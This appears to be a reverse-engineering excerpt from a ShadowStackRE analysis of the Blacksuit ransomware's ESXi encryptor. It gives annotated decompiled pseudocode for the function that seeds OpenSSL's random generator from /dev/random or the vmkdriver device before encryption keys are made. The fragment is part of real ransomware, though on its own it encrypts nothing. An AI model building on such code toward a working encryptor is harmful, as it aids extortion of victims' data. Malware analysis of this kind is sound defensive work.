////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
//
// Technique: Data encrypted for impact
// URL: https://attack.mitre.org/techniques/T1486/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// Generate entropy to use for encrypting a file and creating a secure key
__int64 __fastcall generateEntropy(__int64 a1, const char *a2)
{
  const char *randResult2; // rsi
  char entropyBuffer[2056]; // [rsp+0h] [rbp-810h] BYREF
  int randResult1; // [rsp+808h] [rbp-8h]
  int fd; // [rsp+80Ch] [rbp-4h]

  logs::print((logs *)"Please wait, entropy reading in progress.", a2);
  randResult1 = RAND_status();
  // Check if entropy has been seeded
  randResult2 = (const char *)(unsigned int)RAND_status();
  logs::print((logs *)"Filling check status %d", randResult2);
  if ( randResult1 )
    goto LABEL_9;
  // Blocking for entropy
  fd = open("/dev/random", 0);
  if ( fd == -1 )
  {
    // Blocking for entropy
    fd = open("/dev/char/vmkdriver/random", 0);
    if ( fd == -1 )
    {
      logs::print((logs *)"Can't open /dev/char/vmkdriver/random", 0LL);
      return 0LL;
    }
  }
  // Read the FD descriptor for entropy, upto 2048 bytes
  if ( (unsigned __int8)read_all(fd, (unsigned __int8 *)entropyBuffer, 2048LL) != 1 )
  {
    close(fd);
    logs::print((logs *)"Can't read from /dev/random or /dev/char/vmkdriver/random", entropyBuffer);
    return 0LL;
  }
  close(fd);
  randResult2 = "ssl_ret_";
  RAND_add(entropyBuffer, "ssl_ret_", 2048.0);
  randResult1 = RAND_status();
  if ( randResult1 )
  {
LABEL_9:
    logs::print((logs *)"Entropy collected!", randResult2);
    return 1LL;
  }
  else
  {
    logs::print((logs *)"RAND_add - failed", "ssl_ret_");
    return 0LL;
  }
}